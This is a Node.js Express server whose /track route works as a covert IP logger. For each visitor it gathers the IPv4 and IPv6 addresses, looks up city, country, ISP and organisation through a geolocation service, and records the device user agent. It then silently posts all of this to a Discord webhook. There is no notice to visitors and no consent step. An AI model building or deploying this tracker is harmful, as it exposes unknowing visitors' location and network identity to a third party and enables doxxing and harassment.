import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE";

app.set("trust proxy", true);

// Home
app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// TRACK ROUTE
app.get("/track", async (req, res) => {

    // =========================
    // 1. RAW IP DATA
    // =========================
    const forwarded = req.headers["x-forwarded-for"];
    const socketIp = req.socket.remoteAddress || "Unknown";

    let ipList = [];

    if (forwarded) {
        ipList = forwarded.split(",").map(ip => ip.trim());
    }

    // Add socket IP as fallback
    ipList.push(socketIp);

    // Clean all IPs
    ipList = ipList
        .map(ip => ip.replace("::ffff:", "").trim())
        .filter(Boolean);

    // =========================
    // 2. PRIORITIZE IPV6
    // =========================
    const ipv6 = ipList.find(ip => ip.includes(":"));
    const ipv4 = ipList.find(ip => ip.includes("."));

    const realIp = ipv6 || ipv4 || "Unknown";

    const userAgent = req.headers["user-agent"] || "Unknown";

    const isIPv6 = realIp.includes(":");
    const isIPv4 = realIp.includes(".");

    // =========================
    // 3. GEO LOOKUP (ONLY IF VALID IP)
    // =========================
    let city = "Unknown";
    let country = "Unknown";
    let isp = "Unknown";
    let org = "Unknown";

    const isLocal =
        realIp === "::1" ||
        realIp === "127.0.0.1" ||
        realIp.startsWith("192.168.") ||
        realIp.startsWith("10.") ||
        realIp.startsWith("172.");

    if (!isLocal && realIp !== "Unknown") {
        try {
            const geoRes = await fetch(`https://ipwho.is/${realIp}`);
            const data = await geoRes.json();

            if (data.success) {
                city = data.city || "Unknown";
                country = data.country || "Unknown";
                isp = data.connection?.isp || "Unknown";
                org = data.connection?.org || "Unknown";
            }
        } catch (err) {
            console.error("Geo lookup failed:", err);
        }
    }

    // =========================
    // 4. DISCORD MESSAGE
    // =========================
    const message = `
🇵🇭 New Visitor Logged

🌐 IPv6: ${ipv6 || "None"}
🌐 IPv4: ${ipv4 || "None"}
🌍 Chosen IP: ${realIp}

📶 Type: ${isIPv6 ? "IPv6" : isIPv4 ? "IPv4" : "Unknown"}

📍 Location: ${city}, ${country}
🏢 ISP: ${isp}
🏢 Org: ${org}

🖥️ Device: ${userAgent}
`;

    // =========================
    // 5. SEND TO DISCORD
    // =========================
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error("Webhook failed:", err);
    }

    res.sendStatus(200);
});

// START
app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});
